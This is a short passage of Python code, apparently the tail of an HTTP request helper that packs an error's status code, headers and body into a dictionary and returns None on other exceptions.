            return {"status":e.code,"headers":dict(e.headers),"body":b}
        except Exception:
            return None
